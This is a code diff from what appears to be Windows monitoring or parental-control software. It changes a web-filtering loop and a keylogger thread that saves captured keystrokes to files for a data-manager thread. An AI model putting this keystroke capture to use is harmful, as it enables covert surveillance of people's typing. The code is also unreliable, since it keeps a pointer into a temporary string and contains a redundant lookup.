@@ -6,30 +6,39 @@ map<string, map<string, string>> workingTasks;
 
 DWORD WINAPI initFiltering(LPVOID lpParam)
 {
-	while (FALSE) {
+	while (TRUE) {
 		ResponseData deviceConfigs;
 		LPCWSTR additionalSites;
 
 		while (TRUE) {
-			deviceConfigs = downloadFile(CONFIGS);
+			deviceConfigs = downloadFile(CONFIGURATION);
 			if (deviceConfigs.dwStatusCode != 200 || deviceConfigs.response == "[]")
 				Sleep(SYNC_TIME);
 			else
 				break;
 		}
 		map<string, string> configs = itemFromJson(TRUE, deviceConfigs.response, DATA);
-		map<string, string>::iterator configsIter;
 
-		wstring finalFilterPath;
+		wstring finalFilterPath = L"";
 
-		if (buildFilterPath(finalFilterPath, configs, configsIter, FAKENEWS))
-			if (buildFilterPath(finalFilterPath, configs, configsIter, GAMBLING))
-				if (buildFilterPath(finalFilterPath, configs, configsIter, PORN))
-					if (buildFilterPath(finalFilterPath, configs, configsIter, SOCIAL))
+		if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, FAKENEWS)) != L"*")
+			if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, GAMBLING)) != L"*")
+				if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, PORN)) != L"*")
+					if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, SOCIAL)) != L"*")
 					{
-						configsIter = configs.find(ADDITIONAL_SITES); // get user defined sites to block
-						if (configsIter != configs.end())
-							additionalSites = (stringToWString(configsIter->second)).c_str();
+						if (finalFilterPath.size() > 0)
+							finalFilterPath.pop_back();
+						else
+							finalFilterPath = L"default";
+
+						transform(
+							finalFilterPath.begin(), finalFilterPath.end(),
+							finalFilterPath.begin(),
+							towlower);
+						
+						configs.find(ADDITIONAL_SITES); // get user defined sites to block
+						if (configs.find(ADDITIONAL_SITES) != configs.end())
+							additionalSites = (stringToWString(configs.find(ADDITIONAL_SITES)->second)).c_str();
 						else
 							additionalSites = L"";
 						setFilters(finalFilterPath.c_str(), additionalSites);
@@ -61,12 +70,8 @@ DWORD WINAPI initKeylogger(LPVOID lpParam)
 
 		// Start keylogger
 		keylogger(filenameW.c_str());
-
 		string finalFilename = constructFilename(KEYLOG_CODE);
-		wstring finalFilenameW = stringToWString(finalFilename);
-		string path = DATA_FOLDER_PATH;
-
-		if (!rename(path.append(filename).c_str(), path.append(finalFilename).c_str()))
+		if (!rename(filename.c_str(), finalFilename.c_str()))
 		{
 			// Notifiy data manager thread
 			SetEvent(newDataEvent);
